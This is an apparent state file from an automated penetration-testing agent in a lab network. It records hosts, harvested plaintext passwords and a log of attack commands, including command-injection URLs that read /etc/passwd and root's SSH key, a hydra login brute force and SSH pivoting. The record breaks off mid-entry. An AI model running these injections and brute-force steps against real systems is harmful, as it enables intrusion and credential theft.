@@ -1,0 +1,1330 @@
+{
+ "hosts": [
+  {
+   "endereco": "172.20.0.5",
+   "nome": "atacante",
+   "subrede": "172.20.0.0/24",
+   "enumerado": false,
+   "comprometido": true,
+   "meio_de_acesso": null,
+   "origem": true,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": []
+  },
+  {
+   "endereco": "172.20.0.1",
+   "nome": null,
+   "subrede": "172.20.0.0/24",
+   "enumerado": false,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": []
+  },
+  {
+   "endereco": "172.20.0.10",
+   "nome": "tcc-host-web.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": true,
+   "meio_de_acesso": "injecao de comando em /diagnostico (param destino)",
+   "origem": false,
+   "titulo": "Diagnostico de rede -- infra interna",
+   "rotas": [
+    {
+     "caminho": "/diagnostico",
+     "metodo": "GET",
+     "parametros": [
+      "destino"
+     ],
+     "porta": 8080
+    }
+   ],
+   "usuario": "root",
+   "uid": 0,
+   "caminhos": [
+    "/home",
+    "/opt",
+    "/root",
+    "/opt/diagnostico",
+    "/root/.bashrc",
+    "/root/.profile",
+    "/root/.python_history",
+    "/root/.wget-hsts",
+    "/opt/diagnostico/config.ini"
+   ],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 8080,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "http-proxy",
+     "versao": "Werkzeug/3.1.9 Python/3.11.17",
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.11",
+   "nome": "tcc-host-glhf.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": "Redirecting...",
+   "rotas": [
+    {
+     "caminho": "/login",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/login",
+     "metodo": "POST",
+     "parametros": [
+      "username",
+      "password"
+     ],
+     "porta": 1337
+    },
+    {
+     "caminho": "/register",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/download/readme.txt",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/download/nicks.txt",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/download/rockyou.txt",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    }
+   ],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 1337,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "waste",
+     "versao": null,
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.12",
+   "nome": "tcc-srv-deploy.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": true,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": "svc_deploy",
+   "uid": 1000,
+   "caminhos": [
+    "/usr/share/nmap/scripts/http-cookie-flags.nse",
+    "/usr/share/mime/text/x-troff-ms.xml",
+    "/usr/share/mime/text/x-troff-me.xml",
+    "/usr/share/mime/text/troff.xml",
+    "/usr/share/mime/text/x-troff-mm.xml",
+    "/usr/share/mime/application/x-troff-man-compressed.xml",
+    "/usr/share/mime/application/x-troff-man.xml",
+    "/home/svc_deploy",
+    "/opt",
+    "/srv",
+    "/home/svc_deploy/.bash_logout",
+    "/home/svc_deploy/.bashrc",
+    "/home/svc_deploy/.profile",
+    "/usr/lib/openssh/ssh-keysign",
+    "/usr/bin/chsh",
+    "/usr/bin/chfn",
+    "/usr/bin/newgrp",
+    "/usr/bin/mount",
+    "/usr/bin/su",
+    "/usr/bin/umount",
+    "/usr/bin/gpasswd",
+    "/usr/bin/passwd",
+    "/bin/bash",
+    "/usr/local/bin",
+    "/usr/bin/env",
+    "/usr/sbin/sshd"
+   ],
+   "caminhos_omitidos": 0,
+   "mencionados": [
+    "/dev/null",
+    "/home/svc_deploy/.bash_history",
+    "/dev/tcp/172.21.0.12"
+   ],
+   "associados": {},
+   "interfaces": [
+    {
+     "nome": "eth0",
+     "endereco": "172.21.0.2",
+     "subrede": "172.21.0.0/24"
+    },
+    {
+     "nome": "eth1",
+     "endereco": "172.20.0.12",
+     "subrede": "172.20.0.0/24"
+    }
+   ],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 22,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "ssh",
+     "versao": "OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)",
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.21.0.1",
+   "nome": null,
+   "subrede": "172.21.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 111,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "rpcbind",
+     "versao": "2-4 (RPC #100000)",
+     "incerto": false
+    },
+    {
+     "porta": 55263,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "status",
+     "versao": "1 (RPC #100024)",
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.21.0.10",
+   "nome": "tcc-host-db.tcc-lab_interna",
+   "subrede": "172.21.0.0/24",
+   "enumerado": true,
+   "comprometido": true,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": "svc_deploy",
+   "uid": 1000,
+   "caminhos": [
+    "/opt",
+    "/srv",
+    "/usr/sbin/sshd",
+    "/dev/null",
+    "/var/lib",
+    "/home/svc_deploy/.bash_history",
+    "/bin/bash",
+    "/home/svc_deploy",
+    "/usr/local/bin",
+    "/usr/bin/env",
+    "/var/lib/apt",
+    "/var/lib/dpkg",
+    "/var/lib/misc",
+    "/var/lib/pam",
+    "/var/lib/shells.state",
+    "/var/lib/systemd",
+    "/var/lib/ucf",
+    "/usr/lib/apt/solvers/dump",
+    "/usr/lib/apt/planners/dump",
+    "/usr/share/bash-completion/completions/utmpdump",
+    "/usr/sbin/dumpe2fs",
+    "/usr/bin/utmpdump",
+    "/usr/bin/zdump",
+    "/usr/lib/openssh/ssh-keysign",
+    "/usr/bin/chsh",
+    "/usr/bin/chfn",
+    "/usr/bin/newgrp",
+    "/usr/bin/mount",
+    "/usr/bin/su",
+    "/usr/bin/umount",
+    "/usr/bin/gpasswd",
+    "/usr/bin/passwd",
+    "/root"
+   ],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 22,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "ssh",
+     "versao": "OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)",
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.21.0.11",
+   "nome": "tcc-host-arquivo.tcc-lab_interna",
+   "subrede": "172.21.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 22,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "ssh",
+     "versao": "OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)",
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.21.0.12",
+   "nome": "tcc-srv-financeiro.tcc-lab_interna",
+   "subrede": "172.21.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {
+    "/dev/tcp/172.21.0.12": "172.20.0.12",
+    "/dev/null": "172.20.0.12"
+   },
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 22,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "ssh",
+     "versao": "OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)",
+     "incerto": false
+    }
+   ]
+  }
+ ],
+ "credenciais": [
+  {
+   "usuario": "svc_deploy",
+   "tipo": "senha",
+   "segredo": "7fQx2Lm9RtVzB4kd",
+   "identidade": null,
+   "origem": "172.20.0.10",
+   "tentada_em": [
+    "172.20.0.12",
+    "172.21.0.12",
+    "172.21.0.10",
+    "172.21.0.11"
+   ],
+   "validada_em": [
+    "172.20.0.12",
+    "172.21.0.10"
+   ],
+   "recusada_em": [
+    "172.21.0.12",
+    "172.21.0.11"
+   ]
+  },
+  {
+   "usuario": "n1ghtfox",
+   "tipo": "senha",
+   "segredo": "1337gamer",
+   "identidade": null,
+   "origem": "172.20.0.11",
+   "tentada_em": [
+    "172.20.0.11",
+    "172.21.0.12",
+    "172.21.0.11"
+   ],
+   "validada_em": [],
+   "recusada_em": [
+    "172.21.0.12",
+    "172.21.0.11"
+   ]
+  }
+ ],
+ "alcances": [
+  {
+   "origem": "172.20.0.12",
+   "destino": "172.20.0.12",
+   "via": "172.20.0.12"
+  },
+  {
+   "origem": "172.20.0.12",
+   "destino": "172.21.0.10",
+   "via": "172.20.0.12"
+  }
+ ],
+ "tentativas": [
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sn 172.20.0.0/24",
+   "rotulo": "nmap -sn 172.20.0.0/24",
+   "alvo": "172.20.0.0/24",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "5 hosts, 0 servicos",
+   "revisao": 2,
+   "revisao_ao_abrir": 1
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.10",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.10",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 3,
+   "revisao_ao_abrir": 2
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.10:8080/",
+   "rotulo": "curl http://172.20.0.10:8080/",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 4,
+   "revisao_ao_abrir": 3
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.10:8080/diagnostico?destino=;id",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=;id'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: usuario root",
+   "revisao": 6,
+   "revisao_ao_abrir": 4
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.10:8080/diagnostico?destino=;cat%20/etc/passwd%20/root/.ssh/id_rsa%20/root/*.txt%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=;cat%20/etc/passwd%20/root/.ssh/id_rsa%20/root/*.txt%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 6,
+   "revisao_ao_abrir": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.10:8080/diagnostico?destino=;find / -iname \"*trof*\" -o -iname \"*flag*\" -o -iname \"*.key\" 2>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=;find / -iname \"*trof*\" -o -iname \"*flag*\" -o -iname \"*.key\" 2>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 3): curl: (3) URL using bad/illegal format or missing URL; http nao observado, 0 credencial(is)",
+   "revisao": 6,
+   "revisao_ao_abrir": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.10:8080/diagnostico?destino=;find%20/%20-iname%20*trof*%20-o%20-iname%20*flag*%20-o%20-iname%20*.key%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=;find%20/%20-iname%20*trof*%20-o%20-iname%20*flag*%20-o%20-iname%20*.key%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 6,
+   "revisao_ao_abrir": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.10:8080/diagnostico?destino=;ls%20-la%20/root%20/home%20/opt%20/var/www%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=;ls%20-la%20/root%20/home%20/opt%20/var/www%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: 8 caminhos novos",
+   "revisao": 7,
+   "revisao_ao_abrir": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.10:8080/diagnostico?destino=;cat%20/opt/diagnostico/*%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=;cat%20/opt/diagnostico/*%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 1 credencial(is); saida: 1 caminhos novos",
+   "revisao": 9,
+   "revisao_ao_abrir": 7
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ssh svc_deploy@172.20.0.12",
+   "rotulo": "ssh svc_deploy@172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 255): Pseudo-terminal will not be allocated because stdin is not a terminal.; falha de ssh",
+   "revisao": 9,
+   "revisao_ao_abrir": 9
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.20.0.12 id",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.20.0.12 id",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: usuario svc_deploy",
+   "revisao": 11,
+   "revisao_ao_abrir": 9
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.12",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 12,
+   "revisao_ao_abrir": 11
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "find / -iname *trof* -o -iname *flag* -o -iname *.key 2>/dev/null",
+   "rotulo": "find / -iname '*trof*' '*flag*' '*.key' '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "o servidor nao registrou sessao aceita; saida: 7 caminhos novos",
+   "revisao": 13,
+   "revisao_ao_abrir": 12
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "find /root /home /opt /var /tmp -iname *trof* -o -iname *flag* -o -iname *.key 2>/dev/null",
+   "rotulo": "find /root /home /opt /var /tmp -iname '*trof*' '*flag*' '*.key' '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1); sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 14,
+   "revisao_ao_abrir": 13
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ls -la /opt /srv /var/www /home/svc_deploy 2>/dev/null",
+   "rotulo": "ls -la /opt /srv /var/www /home/svc_deploy '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 2): /home/svc_deploy:; sessao estabelecida; saida: 6 caminhos novos",
+   "revisao": 15,
+   "revisao_ao_abrir": 14
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sudo -l 2>/dev/null; ls -la /opt/* /srv/* 2>/dev/null",
+   "rotulo": "sudo -l '2>/dev/null;' ls -la '/opt/*' '/srv/*' '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 2); sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 15,
+   "revisao_ao_abrir": 15
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.11",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.11",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 16,
+   "revisao_ao_abrir": 15
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "netcat -nv 172.20.0.11 1337",
+   "rotulo": "netcat -nv 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "netcat falhou (codigo -1): Connection to 172.20.0.11 1337 port [tcp/*] succeeded!; 172.20.0.11:1337 aberta; a conexao abriu e o servico nao respondeu nada",
+   "revisao": 16,
+   "revisao_ao_abrir": 16
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "netcat -nv 172.20.0.11 1337 <<< HELP",
+   "rotulo": "netcat -nv 172.20.0.11 1337 '<<<' HELP",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "netcat falhou (codigo 2): sh: 1: Syntax error: redirection unexpected; executado, codigo 2, 44 bytes de resposta",
+   "revisao": 16,
+   "revisao_ao_abrir": 16
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "echo HELP | netcat -nv 172.20.0.11 1337",
+   "rotulo": "echo HELP '|' netcat -nv 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "172.20.0.11:1337 aberta; o servico respondeu HTTP, codigo 400",
+   "revisao": 17,
+   "revisao_ao_abrir": 16
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.11:1337/",
+   "rotulo": "curl http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 18,
+   "revisao_ao_abrir": 17
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.11:1337/login",
+   "rotulo": "curl http://172.20.0.11:1337/login",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 19,
+   "revisao_ao_abrir": 18
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i http://172.20.0.11:1337/download/readme.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 19,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/nicks.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/nicks.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1871 bytes de corpo, 0 credencial(is)",
+   "revisao": 19,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -o /tmp/nicks.txt http://172.20.0.11:1337/download/nicks.txt && cat /tmp/nicks.txt",
+   "rotulo": "curl -o /tmp/nicks.txt http://172.20.0.11:1337/download/nicks.txt '&&' cat /tmp/nicks.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1871 bytes de corpo, 0 credencial(is)",
+   "revisao": 19,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -L /tmp/nicks.txt -P /tmp/nicks.txt -f http-post-form 172.20.0.11:1337/login:username=^USER^&password=^PASS^:F=incorrect",
+   "rotulo": "hydra -L /tmp/nicks.txt -f http-post-form '172.20.0.11:1337/login:username=^USER^&password=^PASS^:F=incorrect'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "hydra falhou (codigo 255): [ERROR] Unknown service: 172.20.0.11:1337/login:username=^USER^&password=^PASS^:F=incorrect; 0 senha(s), concluida=False",
+   "revisao": 19,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -L /tmp/nicks.txt -P /tmp/nicks.txt -s 1337 -f 172.20.0.11 http-post-form /login:username=^USER^&password=^PASS^:F=incorrect",
+   "rotulo": "hydra -L /tmp/nicks.txt -s 1337 -f 172.20.0.11 http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 senha(s), concluida=True",
+   "revisao": 20,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i -c /tmp/h04_cookies.txt -X POST -d username=n1ghtfox&password=c02 http://172.20.0.11:1337/login",
+   "rotulo": "curl -c /tmp/h04_cookies.txt -X POST -d 'username=n1ghtfox&password=c02' http://172.20.0.11:1337/login",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i -b /tmp/h04_cookies.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -b /tmp/h04_cookies.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i -L -b /tmp/h04_cookies.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -L -b /tmp/h04_cookies.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i -s -X POST -d username=n1ghtfox&password=c02 http://172.20.0.11:1337/login -c /tmp/h04_cookies.txt | head -c 2000",
+   "rotulo": "curl -X POST -d 'username=n1ghtfox&password=c02' http://172.20.0.11:1337/login -c /tmp/h04_cookies.txt '|' head -c 2000",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -X POST -d username=n1ghtfox&password=c02 http://172.20.0.11:1337/login",
+   "rotulo": "curl -X POST -d 'username=n1ghtfox&password=c02' http://172.20.0.11:1337/login",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -X POST -d username=test&password=wrongpass http://172.20.0.11:1337/login",
+   "rotulo": "curl -X POST -d 'username=test&password=wrongpass' http://172.20.0.11:1337/login",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -X POST -d username=test&password=wrongpass http://172.20.0.11:1337/login | grep -i -E incorrect|invalid|error|welcome|dashboard|success",
+   "rotulo": "curl -X POST -d 'username=test&password=wrongpass' http://172.20.0.11:1337/login '|' grep -E 'incorrect|invalid|error|welcome|dashboard|success'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 77 bytes de corpo, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -X POST -d username=n1ghtfox&password=c02 http://172.20.0.11:1337/login | grep -i -E incorrect|invalid|error|welcome|dashboard|success",
+   "rotulo": "curl -X POST -d 'username=n1ghtfox&password=c02' http://172.20.0.11:1337/login '|' grep -E 'incorrect|invalid|error|welcome|dashboard|success'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 77 bytes de corpo, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -X POST -d username=n1ghtfox&password=c02 http://172.20.0.11:1337/login -o /tmp/valid.html && curl -s -X POST -d username=test&password=wrongpass http://172.20.0.11:1337/login -o /tmp/invalid.html && diff /tmp/valid.html /tmp/invalid.html",
+   "rotulo": "curl -X POST -d 'username=n1ghtfox&password=c02' http://172.20.0.11:1337/login -o /tmp/valid.html '&&' -X POST -d 'username=test&password=wrongpass' http://172.20.0.11:1337/login -o /tmp/invalid.html '&&' diff /tmp/valid.html /tmp/invalid.html",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 1): 27c27; http nao observado, 202 bytes de corpo, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -X POST -d username=n1ghtfox&password=c02 http://172.20.0.11:1337/login -o /tmp/valid.html && curl -s -X POST -d username=test&password=wrongpass http://172.20.0.11:1337/login -o /tmp/invalid.html && diff -u /tmp/invalid.html /tmp/valid.html",
+   "rotulo": "curl -X POST -d 'username=n1ghtfox&password=c02' http://172.20.0.11:1337/login -o /tmp/valid.html '&&' -X POST -d 'username=test&password=wrongpass' http://172.20.0.11:1337/login -o /tmp/invalid.html '&&' diff -u /tmp/invalid.html /tmp/valid.html",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 1): --- /tmp/invalid.html\t2026-10-02 20:48:02.459041606 +0000; http nao observado, 564 bytes de corpo, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s /tmp/valid.html -o /dev/null; cat /tmp/valid.html",
+   "rotulo": "curl /tmp/valid.html -o '/dev/null;' cat /tmp/valid.html",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1870 bytes de corpo, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "cat /tmp/valid.html",
+   "rotulo": "curl cat /tmp/valid.html",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1870 bytes de corpo, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///tmp/valid.html",
+   "rotulo": "curl file:///tmp/valid.html",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1870 bytes de corpo, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "echo c01 | sudo -S -l 2>&1",
+   "rotulo": "echo c01 '|' sudo -S -l '2>&1'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "c01 resolvida para o segredo da credencial; ssh falhou (codigo 127): bash: line 1: sudo: command not found; sessao estabelecida; saida: ferramenta ausente neste host: sudo",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "find / -perm -4000 -type f 2>/dev/null",
+   "rotulo": "find / -perm -4000 -type f '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
